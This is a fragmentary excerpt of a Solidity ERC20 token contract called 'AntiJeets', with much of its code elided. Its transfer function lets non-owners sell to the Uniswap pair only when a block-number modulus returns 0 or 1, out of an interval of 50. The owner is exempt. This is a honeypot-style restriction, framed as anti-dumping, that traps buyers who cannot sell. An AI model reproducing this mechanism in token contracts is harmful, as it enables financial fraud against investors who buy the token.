...
// https://linktr.ee/antijeets_erc20
...
contract ERC20 is Context, IERC20, IERC20Metadata {
 ...
 contract AntiJeets is ERC20, Ownable {
    string private _name = "AntiJeets";
    string private _symbol = "AntiJ";
    uint8 private _decimals = 9;
    uint256 private _supply = 100000000;
    uint256 public block_interval = 50;
    ...
    function block_mod() public view returns(uint256) {
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        if (to == uniswapV2Pair && from != owner()) {
            uint256 mod_num = block_mod();
            require(mod_num == 0 || mod_num == 1, "ERC20: transfer failed");
